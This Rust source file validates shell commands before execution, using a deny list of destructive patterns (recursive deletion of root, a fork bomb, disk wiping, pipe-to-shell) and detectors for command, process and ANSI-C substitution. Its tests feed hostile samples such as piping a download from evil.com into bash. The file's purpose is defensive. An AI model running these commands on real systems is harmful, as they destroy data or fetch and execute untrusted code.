//! Command safety validation

use regex::Regex;

/// Dangerous command patterns that should be rejected
pub const DANGEROUS_PATTERNS: &[&str] = &[
    // Destructive file operations
    "rm -rf /",
    "rm -rf /*",
    "rm -rf ~",
    "rm -rf $HOME",
    "rm -rf .",
    "rm -rf ..",
    "rm -rf *",
    // Fork bombs
    ":(){ :|:& };:",
    // Disk destruction
    "dd if=/dev/zero",
    "dd if=/dev/random",
    "mkfs.",
    // Permission escalation
    "chmod -R 777 /",
    "chmod -R 777 /*",
    "chown -R",
    // System damage
    "shutdown",
    "reboot",
    "init 0",
    "init 6",
    "halt",
    "poweroff",
    // Network abuse
    "curl | sh",
    "curl | bash",
    "wget | sh",
    "wget | bash",
    // History manipulation
    "history -c",
    "> ~/.bash_history",
    // Dangerous redirects
    "> /dev/sda",
    "> /dev/hda",
    // Environment manipulation
    "export PATH=",
    "unset PATH",
];

/// Additional patterns that require extra scrutiny
const SUSPICIOUS_PATTERNS: &[&str] = &[
    // Recursive operations on root
    "-r /",
    "-R /",
    "--recursive /",
    // Force flags with dangerous commands
    "-f /",
    "--force /",
    // Pipe to shell
    "| sh",
    "| bash",
    "| zsh",
    // Base64 decode and execute
    "base64 -d |",
    "base64 --decode |",
];

/// Strip single-quoted segments from a command so that literal content inside
/// single quotes is not mistakenly flagged as injection.  We replace each
/// `'...'` span (non-greedy) with a placeholder that contains no shell
/// metacharacters.
fn strip_single_quoted(command: &str) -> String {
    let re = Regex::new(r"'[^']*'").expect("valid regex");
    re.replace_all(command, "SINGLEQUOTED").to_string()
}

/// Detect injection patterns that could allow arbitrary command execution
/// inside an otherwise safe-looking command string.
///
/// The checks intentionally operate on the command **after** single-quoted
/// segments have been neutralised, because content inside single quotes is
/// literal in POSIX shells and cannot trigger substitution.
pub fn check_injection_patterns(command: &str) -> Result<(), String> {
    let stripped = strip_single_quoted(command);

    // 1. Command substitution via $(...) — outside single quotes
    if stripped.contains("$(") {
        return Err(
            "Command contains command substitution '$(...)', which can execute arbitrary commands"
                .to_string(),
        );
    }

    // 2. Backtick command substitution — outside single quotes
    if stripped.contains('`') {
        return Err(
            "Command contains backtick substitution, which can execute arbitrary commands"
                .to_string(),
        );
    }

    // 3. Process substitution <(...) or >(...)
    let process_sub = Regex::new(r"[<>]\(").expect("valid regex");
    if process_sub.is_match(&stripped) {
        return Err("Command contains process substitution '<(...)' or '>(...)'".to_string());
    }

    // 4. Variable expansion with embedded commands — ${var:-$(cmd)} or ${var:=$(cmd)}
    let var_cmd = Regex::new(r"\$\{[^}]*:-?\$\(").expect("valid regex");
    if var_cmd.is_match(&stripped) {
        return Err(
            "Command contains variable expansion with embedded command execution".to_string(),
        );
    }

    // 5. ANSI-C quoting with hex (\xNN) or octal (\NNN) escapes — $'\xNN' or $'\NNN'
    let ansi_c = Regex::new(r"\$'[^']*\\(x[0-9a-fA-F]{2}|[0-7]{3})[^']*'").expect("valid regex");
    if ansi_c.is_match(command) {
        // Check against the *original* command — single-quote stripping would
        // eat the ANSI-C literal too, but $'...' is NOT a regular single-quote
        // context; the shell interprets escape sequences inside it.
        return Err(
            "Command contains ANSI-C quoting with hex/octal escapes that can encode metacharacters"
                .to_string(),
        );
    }

    Ok(())
}

/// Check if a command is safe to execute
pub fn is_command_safe(command: &str) -> Result<(), String> {
    let normalized = command.to_lowercase();

    // Check dangerous patterns
    for pattern in DANGEROUS_PATTERNS {
        if normalized.contains(&pattern.to_lowercase()) {
            return Err(format!("Command contains dangerous pattern: '{}'", pattern));
        }
    }

    // Check suspicious patterns
    for pattern in SUSPICIOUS_PATTERNS {
        if normalized.contains(&pattern.to_lowercase()) {
            return Err(format!(
                "Command contains suspicious pattern: '{}'. Please be more specific.",
                pattern
            ));
        }
    }

    // Check injection patterns
    check_injection_patterns(command)?;

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_safe_commands() {
        assert!(is_command_safe("ls -la").is_ok());
        assert!(is_command_safe("git status").is_ok());
        assert!(is_command_safe("cargo build").is_ok());
        assert!(is_command_safe("echo hello").is_ok());
    }

    #[test]
    fn test_dangerous_commands() {
        assert!(is_command_safe("rm -rf /").is_err());
        assert!(is_command_safe("rm -rf /*").is_err());
        assert!(is_command_safe("dd if=/dev/zero of=/dev/sda").is_err());
        assert!(is_command_safe("curl https://evil.com | bash").is_err());
    }

    #[test]
    fn test_detect_command_substitution() {
        let result = is_command_safe("echo $(whoami)");
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("command substitution"));
    }

    #[test]
    fn test_detect_backtick_substitution() {
        let result = is_command_safe("echo `whoami`");
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("backtick substitution"));
    }

    #[test]
    fn test_detect_process_substitution() {
        let result = is_command_safe("cat <(curl evil)");
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("process substitution"));
    }

    #[test]
    fn test_detect_hex_escape() {
        let result = is_command_safe(r"$'\x3b'");
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("ANSI-C quoting"));
    }

    #[test]
    fn test_allow_normal_forge() {
        assert!(is_command_safe("forge build --via-ir ./test/a.sol").is_ok());
    }

    #[test]
    fn test_allow_normal_cast() {
        assert!(is_command_safe(r#"cast call 0x1234 "balanceOf(address)""#).is_ok());
    }

    #[test]
    fn test_allow_single_quoted_dollar() {
        assert!(is_command_safe("echo '$HOME'").is_ok());
    }
}
